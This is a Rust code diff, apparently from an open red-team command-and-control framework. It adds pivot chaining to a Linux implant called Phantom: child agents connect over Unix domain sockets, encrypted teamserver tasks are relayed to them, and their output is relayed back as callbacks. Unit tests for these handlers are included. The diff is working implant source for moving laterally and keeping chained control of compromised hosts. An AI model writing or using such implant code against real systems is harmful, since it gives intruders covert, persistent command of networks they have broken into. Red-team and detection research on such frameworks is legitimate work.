@@ -6,13 +6,15 @@ use std::fs;
 use std::io::{ErrorKind, Read, Write};
 use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
 use std::os::unix::fs::MetadataExt;
+use std::os::unix::net::UnixStream;
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use red_cell_common::demon::{
     DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonNetCommand,
-    DemonPackage, DemonProcessCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
+    DemonPackage, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand, DemonSocketType,
+    DemonTransferCommand,
 };
 use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
@@ -47,10 +49,21 @@ pub(crate) struct PhantomState {
     socks_clients: HashMap<u32, SocksClient>,
     downloads: Vec<ActiveDownload>,
     pending_callbacks: Vec<PendingCallback>,
+    /// Active SMB pivot connections keyed by child agent DemonID.
+    smb_pivots: HashMap<u32, PivotConnection>,
     /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
     kill_date: Option<i64>,
     /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
     working_hours: Option<i32>,
+}
+
+/// An active pivot connection to a child agent via a Unix domain socket.
+#[derive(Debug)]
+struct PivotConnection {
+    /// The Unix domain socket path used for this pivot.
+    pipe_name: String,
+    /// Non-blocking Unix domain socket connected to the child agent.
+    stream: UnixStream,
 }
 
 #[derive(Debug)]
@@ -241,6 +254,11 @@ const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
 const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
 const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;
 
+/// Maximum number of framed messages to read per pivot per poll cycle.
+const MAX_PIVOT_READS_PER_POLL: usize = 30;
+/// Maximum allowed pivot frame size (30 MiB, matches `DEMON_MAX_RESPONSE_LENGTH`).
+const PIVOT_MAX_FRAME_SIZE: usize = 0x1E0_0000;
+
 impl PhantomState {
     pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
         self.accept_reverse_port_forward_clients().await?;
@@ -249,6 +267,7 @@ impl PhantomState {
         self.poll_local_relays()?;
         self.poll_socks_clients().await?;
         self.push_download_chunks();
+        self.poll_pivots();
         Ok(())
     }
 
@@ -329,6 +348,50 @@ impl PhantomState {
             self.pending_callbacks.push(PendingCallback::FileClose {
                 request_id: download.request_id,
                 file_id: download.file_id,
+            });
+        }
+    }
+
+    /// Poll all active pivot connections for data from child agents.
+    ///
+    /// For each pivot, reads length-framed messages from the Unix socket
+    /// (non-blocking) and wraps them in `DEMON_PIVOT_SMB_COMMAND` callbacks
+    /// for relay to the teamserver. Broken connections are automatically
+    /// removed and reported via `DEMON_PIVOT_SMB_DISCONNECT`.
+    fn poll_pivots(&mut self) {
+        let mut disconnected: Vec<u32> = Vec::new();
+
+        for (&agent_id, pivot) in &mut self.smb_pivots {
+            // Read up to MAX_PIVOT_READS_PER_POLL framed messages per pivot.
+            for _ in 0..MAX_PIVOT_READS_PER_POLL {
+                match pivot_read_frame(&pivot.stream) {
+                    Ok(Some(frame)) => {
+                        let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbCommand));
+                        payload.extend_from_slice(&encode_bytes_result(&frame));
+                        self.pending_callbacks.push(PendingCallback::Structured {
+                            command_id: u32::from(DemonCommand::CommandPivot),
+                            request_id: 0,
+                            payload,
+                        });
+                    }
+                    Ok(None) => break, // no more data available
+                    Err(_) => {
+                        disconnected.push(agent_id);
+                        break;
+                    }
+                }
+            }
+        }
+
+        for agent_id in disconnected {
+            let removed = self.smb_pivots.remove(&agent_id).is_some();
+            let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
+            payload.extend_from_slice(&encode_bool(removed));
+            payload.extend_from_slice(&encode_u32(agent_id));
+            self.pending_callbacks.push(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                request_id: 0,
+                payload,
             });
         }
     }
@@ -808,6 +871,9 @@ pub(crate) async fn execute(
         DemonCommand::CommandConfig => {
             execute_config(package.request_id, &package.payload, state)?;
         }
+        DemonCommand::CommandPivot => {
+            execute_pivot(package.request_id, &package.payload, state)?;
+        }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
             let exit_method = u32::try_from(parser.int32()?)
@@ -908,6 +974,244 @@ fn execute_config(
     }
 
     Ok(())
+}
+
+/// Handle `CommandPivot` (ID 2520) — SMB pivot chain management.
+///
+/// On Linux, Phantom uses Unix domain sockets as the local transport for pivot
+/// chains instead of Windows named pipes.  The subcommand wire format is
+/// identical to the Demon agent so that the teamserver can parse callbacks
+/// without special-casing.
+fn execute_pivot(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let raw_sub = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative pivot subcommand"))?;
+
+    let subcommand = match DemonPivotCommand::try_from(raw_sub) {
+        Ok(sub) => sub,
+        Err(_) => {
+            state.queue_callback(PendingCallback::Error {
+                request_id,
+                text: format!("unknown pivot subcommand {raw_sub}"),
+            });
+            return Ok(());
+        }
+    };
+
+    match subcommand {
+        DemonPivotCommand::List => {
+            let mut response = encode_u32(u32::from(DemonPivotCommand::List));
+            for (&demon_id, pivot) in &state.smb_pivots {
+                response.extend_from_slice(&encode_u32(demon_id));
+                response.extend_from_slice(
+                    &encode_utf16(&pivot.pipe_name)
+                        .map_err(|_| PhantomError::TaskParse("pivot pipe name encode"))?,
+                );
+            }
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                request_id,
+                payload: response,
+            });
+        }
+
+        DemonPivotCommand::SmbConnect => {
+            let pipe_name = parser.wstring()?;
+            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbConnect));
+
+            match pivot_connect(&pipe_name) {
+                Ok((stream, init_data, agent_id)) => {
+                    state.smb_pivots.insert(agent_id, PivotConnection { pipe_name, stream });
+                    response.extend_from_slice(&encode_bool(true));
+                    response.extend_from_slice(&encode_bytes_result(&init_data));
+                }
+                Err(message) => {
+                    response.extend_from_slice(&encode_bool(false));
+                    // Error code — use 0 as a generic "connection failed".
+                    response.extend_from_slice(&encode_u32(0));
+                    state.queue_callback(PendingCallback::Error {
+                        request_id,
+                        text: format!("[SMB] pivot connect failed: {message}"),
+                    });
+                    state.queue_callback(PendingCallback::Structured {
+                        command_id: u32::from(DemonCommand::CommandPivot),
+                        request_id,
+                        payload: response,
+                    });
+                    return Ok(());
+                }
+            }
+
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                request_id,
+                payload: response,
+            });
+        }
+
+        DemonPivotCommand::SmbDisconnect => {
+            let agent_id = parser.int32()? as u32;
+            let removed = state.smb_pivots.remove(&agent_id).is_some();
+
+            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
+            response.extend_from_slice(&encode_bool(removed));
+            response.extend_from_slice(&encode_u32(agent_id));
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                request_id,
+                payload: response,
+            });
+        }
+
+        DemonPivotCommand::SmbCommand => {
+            let agent_id = parser.int32()? as u32;
+            let data = parser.bytes()?;
+
+            if let Some(pivot) = state.smb_pivots.get_mut(&agent_id) {
+                if let Err(e) = pivot_write_raw(&mut pivot.stream, data) {
+                    state.queue_callback(PendingCallback::Error {
+                        request_id,
+                        text: format!("[SMB] pivot write to {agent_id:08x} failed: {e}"),
+                    });
+                }
+            } else {
+                state.queue_callback(PendingCallback::Error {
+                    request_id,
+                    text: format!("[SMB] pivot {agent_id:08x} not found"),
+                });
+            }
+            // SmbCommand does not send a structured response (matches Demon behaviour).
+        }
+    }
+
+    Ok(())
+}
+
+/// Connect to a child agent's Unix domain socket, read its init packet, and
+/// return the stream, raw init data, and parsed child agent ID.
+fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> {
+    let stream = UnixStream::connect(pipe_name).map_err(|e| format!("{e}"))?;
+
+    // Read the child's init packet — a length-framed DemonEnvelope.
+    stream.set_nonblocking(false).map_err(|e| format!("set_nonblocking: {e}"))?;
+    let init_data = pivot_read_envelope_blocking(&stream).map_err(|e| format!("read init: {e}"))?;
+
+    // Parse the child's agent ID from the DemonEnvelope header.
+    // Envelope format: [size:4be][magic:4be][agent_id:4be][payload]
+    if init_data.len() < 12 {
+        return Err("init packet too short to contain DemonHeader".to_owned());
+    }
+    // Size is at offset 0..4, magic at 4..8, agent_id at 8..12.
+    let agent_id = u32::from_be_bytes([init_data[8], init_data[9], init_data[10], init_data[11]]);
+
+    // Switch to non-blocking for subsequent polling.
+    stream.set_nonblocking(true).map_err(|e| format!("set_nonblocking: {e}"))?;
+
+    // The init_data returned includes the full envelope (with size prefix),
+    // matching what the original Demon sends in the connect callback.
+    Ok((stream, init_data, agent_id))
+}
+
+/// Read a single Demon envelope from a Unix domain socket (blocking).
+///
+/// The Demon envelope wire format starts with a big-endian size field:
+/// `[size:u32_be][magic:u32_be][agent_id:u32_be][encrypted:size bytes]`.
+/// The size field counts everything after itself (magic + agent_id + payload),
+/// so total bytes = `4 + size`.
+///
+/// Returns the complete envelope including the size prefix, matching the data
+/// that the original Demon agent returns from `PivotAdd`.
+fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io::Error> {
+    use std::io::Read as IoRead;
+
+    let mut size_buf = [0u8; 4];
+    let mut s = stream;
+    IoRead::read_exact(&mut s, &mut size_buf)?;
+    let size = u32::from_be_bytes(size_buf) as usize;
+
+    if size > PIVOT_MAX_FRAME_SIZE {
+        return Err(std::io::Error::new(
+            ErrorKind::InvalidData,
+            "pivot frame exceeds maximum size",
+        ));
+    }
+
+    let mut frame = Vec::with_capacity(4 + size);
+    frame.extend_from_slice(&size_buf);
+    frame.resize(4 + size, 0);
+    IoRead::read_exact(&mut s, &mut frame[4..])?;
+
+    Ok(frame)
+}
+
+/// Try to read a single Demon envelope from a non-blocking Unix socket.
+///
+/// Returns `Ok(Some(frame))` when a complete envelope is available,
+/// `Ok(None)` when no data is ready (WouldBlock), or `Err` on I/O failure.
+fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Error> {
+    use std::io::Read as IoRead;
+
+    let mut size_buf = [0u8; 4];
+    let mut s = stream;
+    match IoRead::read_exact(&mut s, &mut size_buf) {
+        Ok(()) => {}
+        Err(e) if e.kind() == ErrorKind::WouldBlock => return Ok(None),
+        Err(e) => return Err(e),
+    }
+
+    let size = u32::from_be_bytes(size_buf) as usize;
+    if size > PIVOT_MAX_FRAME_SIZE {
+        return Err(std::io::Error::new(
+            ErrorKind::InvalidData,
+            "pivot frame exceeds maximum size",
+        ));
+    }
+
+    // Once we have the size, switch to blocking to read the remaining bytes.
+    stream
+        .set_nonblocking(false)
+        .map_err(|e| std::io::Error::other(format!("set_nonblocking(false): {e}")))?;
+
+    let mut frame = Vec::with_capacity(4 + size);
+    frame.extend_from_slice(&size_buf);
+    frame.resize(4 + size, 0);
+    let result = IoRead::read_exact(&mut s, &mut frame[4..]);
+
+    // Restore non-blocking regardless of read result.
+    let _ = stream.set_nonblocking(true);
+    result?;
+
+    Ok(Some(frame))
+}
+
+/// Write raw bytes to a pivot Unix domain socket.
+///
+/// The data is written as-is — it is expected to already be a properly framed
+/// Demon envelope (the teamserver provides the encrypted task packet including
+/// the size prefix).
+fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::Error> {
+    use std::io::Write as IoWrite;
+
+    // Temporarily blocking for the write.
+    stream.set_nonblocking(false)?;
+    let result = IoWrite::write_all(stream, data);
+    let _ = stream.set_nonblocking(true);
+
+    result
+}
+
+/// Encode bytes into the big-endian length-prefixed format (like `encode_bytes`
+/// but infallible for pivot use where the caller already holds valid data).
+fn encode_bytes_result(value: &[u8]) -> Vec<u8> {
+    let len = value.len() as u32;
+    let mut out = Vec::with_capacity(4 + value.len());
+    out.extend_from_slice(&len.to_be_bytes());
+    out.extend_from_slice(value);
+    out
 }
 
 async fn execute_filesystem(
@@ -4031,5 +4335,337 @@ mod tests {
         };
         assert_eq!(*request_id, 15);
         assert!(text.contains("unknown config key"));
+    }
+
+    // ---- Pivot tests ----
+
+    use red_cell_common::demon::DemonPivotCommand;
+
+    /// Build a CommandPivot task payload with a given subcommand and extra data.
+    fn pivot_payload(subcommand: DemonPivotCommand, extra: &[u8]) -> Vec<u8> {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(u32::from(subcommand) as i32).to_le_bytes());
+        payload.extend_from_slice(extra);
+        payload
+    }
+
+    /// Build a fake DemonEnvelope for testing pivot connect.
+    ///
+    /// Format: `[size:4be][magic:4be][agent_id:4be][dummy_payload]`
+    fn fake_demon_envelope(agent_id: u32) -> Vec<u8> {
+        let dummy_payload = b"phantom-init-data";
+        let size = (8 + dummy_payload.len()) as u32; // magic(4) + agent_id(4) + payload
+        let mut envelope = Vec::new();
+        envelope.extend_from_slice(&size.to_be_bytes());
+        envelope.extend_from_slice(&0xDEAD_BEEFu32.to_be_bytes());
+        envelope.extend_from_slice(&agent_id.to_be_bytes());
+        envelope.extend_from_slice(dummy_payload);
+        envelope
+    }
+
+    #[tokio::test]
+    async fn pivot_list_empty() {
+        let payload = pivot_payload(DemonPivotCommand::List, &[]);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 1, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
+            panic!("expected Structured callback, got: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
+        assert_eq!(*request_id, 1);
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::List));
+        // No additional data for empty list.
+        assert_eq!(offset, payload.len());
+    }
+
+    #[tokio::test]
+    async fn pivot_list_with_entries() {
+        let mut state = PhantomState::default();
+        // Manually insert a fake pivot to test list.
+        let (left, _right) = std::os::unix::net::UnixStream::pair().expect("pair");
+        left.set_nonblocking(true).expect("nonblocking");
+        state.smb_pivots.insert(
+            0xAABB_CCDDu32,
+            super::PivotConnection { pipe_name: "/tmp/test_pivot".to_owned(), stream: left },
+        );
+
+        let payload = pivot_payload(DemonPivotCommand::List, &[]);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 2, payload);
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured");
+        };
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::List));
+        let demon_id = read_u32(payload, &mut offset);
+        assert_eq!(demon_id, 0xAABB_CCDD);
+        // Skip the UTF-16 encoded pipe name (just verify there's more data).
+        assert!(payload.len() > offset);
+    }
+
+    #[tokio::test]
+    async fn pivot_connect_and_disconnect() {
+        use std::io::Write as IoWrite;
+
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let sock_path = tempdir.path().join("pivot.sock");
+
+        // Set up a listener simulating a child agent.
+        let listener = std::os::unix::net::UnixListener::bind(&sock_path).expect("bind");
+
+        // Spawn a thread that accepts a connection and writes a fake init envelope.
+        let child_agent_id: u32 = 0x1234_5678;
+        let envelope = fake_demon_envelope(child_agent_id);
+        let handle = std::thread::spawn({
+            let envelope = envelope.clone();
+            move || {
+                let (mut conn, _) = listener.accept().expect("accept");
+                // Write the raw DemonEnvelope — its own size field serves as
+                // the frame delimiter on the stream socket.
+                IoWrite::write_all(&mut conn, &envelope).expect("write envelope");
+                conn // keep alive
+            }
+        });
+
+        let sock_str = sock_path.to_str().expect("path");
+        let mut connect_extra = Vec::new();
+        // wstring: [len:i32_le][utf16le_bytes]
+        let utf16 = sock_str.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
+        connect_extra.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
+        connect_extra.extend_from_slice(&utf16);
+
+        let payload = pivot_payload(DemonPivotCommand::SmbConnect, &connect_extra);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 10, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
+            panic!("expected Structured callback, got: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
+        assert_eq!(*request_id, 10);
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::SmbConnect));
+        let success = read_u32(payload, &mut offset);
+        assert_eq!(success, 1); // TRUE
+
+        // Verify the pivot was registered.
+        assert!(state.smb_pivots.contains_key(&child_agent_id));
+
+        // Now disconnect the pivot.
+        let mut disc_extra = Vec::new();
+        disc_extra.extend_from_slice(&(child_agent_id as i32).to_le_bytes());
+        let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &disc_extra);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 11, payload);
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured");
+        };
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
+        let success = read_u32(payload, &mut offset);
+        assert_eq!(success, 1); // TRUE
+        let disc_id = read_u32(payload, &mut offset);
+        assert_eq!(disc_id, child_agent_id);
+
+        assert!(!state.smb_pivots.contains_key(&child_agent_id));
+
+        drop(handle.join().expect("child thread"));
+    }
+
+    #[tokio::test]
+    async fn pivot_disconnect_nonexistent_returns_false() {
+        let mut state = PhantomState::default();
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(0xDEADu32 as i32).to_le_bytes());
+        let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &extra);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 12, payload);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured");
+        };
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
+        let success = read_u32(payload, &mut offset);
+        assert_eq!(success, 0); // FALSE
+    }
+
+    #[tokio::test]
+    async fn pivot_smb_command_writes_to_socket() {
+        use std::io::Read as IoRead;
+
+        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
+        left.set_nonblocking(true).expect("nonblocking");
+
+        let child_id: u32 = 0xABCD_0001;
+        let mut state = PhantomState::default();
+        state.smb_pivots.insert(
+            child_id,
+            super::PivotConnection { pipe_name: "/tmp/test".to_owned(), stream: left },
+        );
+
+        let task_data = b"encrypted-task-payload";
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(child_id as i32).to_le_bytes());
+        extra.extend_from_slice(&(task_data.len() as i32).to_le_bytes());
+        extra.extend_from_slice(task_data);
+
+        let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 20, payload);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        // No structured callback for SmbCommand (matches Demon behaviour).
+        let callbacks = state.drain_callbacks();
+        assert!(callbacks.is_empty());
+
+        // Verify the data was written to the socket.
+        let mut buf = vec![0u8; task_data.len()];
+        let mut r = &right;
+        IoRead::read_exact(&mut r, &mut buf).expect("read from socket");
+        assert_eq!(&buf, task_data);
+    }
+
+    #[tokio::test]
+    async fn pivot_smb_command_unknown_agent_returns_error() {
+        let mut state = PhantomState::default();
+        let unknown_id: u32 = 0xFFFF_0001;
+
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(unknown_id as i32).to_le_bytes());
+        let data = b"payload";
+        extra.extend_from_slice(&(data.len() as i32).to_le_bytes());
+        extra.extend_from_slice(data);
+
+        let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 21, payload);
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Error { text, .. } = &callbacks[0] else {
+            panic!("expected Error callback");
+        };
+        assert!(text.contains("not found"));
+    }
+
+    #[tokio::test]
+    async fn pivot_unknown_subcommand_returns_error() {
+        let payload = (9999i32).to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 30, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Error { text, .. } = &callbacks[0] else {
+            panic!("expected Error callback");
+        };
+        assert!(text.contains("unknown pivot subcommand"));
+    }
+
+    #[tokio::test]
+    async fn poll_pivots_reads_child_data() {
+        use std::io::Write as IoWrite;
+
+        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
+        left.set_nonblocking(true).expect("nonblocking");
+
+        let child_id: u32 = 0x0000_ABCD;
+        let mut state = PhantomState::default();
+        state.smb_pivots.insert(
+            child_id,
+            super::PivotConnection { pipe_name: "/tmp/poll_test".to_owned(), stream: left },
+        );
+
+        // Write a raw DemonEnvelope from the "child" side — its own size
+        // field serves as the frame delimiter.
+        let envelope = fake_demon_envelope(child_id);
+        let mut w = &right;
+        IoWrite::write_all(&mut w, &envelope).expect("write envelope");
+
+        // Give the OS a moment to deliver the data.
+        std::thread::sleep(Duration::from_millis(10));
+
+        state.poll_pivots();
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback from poll");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::SmbCommand));
+
+        // The frame data follows as length-prefixed bytes (the full envelope).
+        let frame_len = read_u32(payload, &mut offset) as usize;
+        assert_eq!(frame_len, envelope.len());
+    }
+
+    #[tokio::test]
+    async fn poll_pivots_detects_broken_connection() {
+        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
+        left.set_nonblocking(true).expect("nonblocking");
+
+        let child_id: u32 = 0xDEAD_0001;
+        let mut state = PhantomState::default();
+        state.smb_pivots.insert(
+            child_id,
+            super::PivotConnection { pipe_name: "/tmp/broken".to_owned(), stream: left },
+        );
+
+        // Close the child side to simulate a broken pipe.
+        drop(right);
+
+        // Give the OS a moment.
+        std::thread::sleep(Duration::from_millis(10));
+
+        state.poll_pivots();
+
+        // Should have removed the pivot and sent a disconnect callback.
+        assert!(!state.smb_pivots.contains_key(&child_id));
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
+
+        let mut offset = 0;
+        let sub = read_u32(payload, &mut offset);
+        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
     }
 }
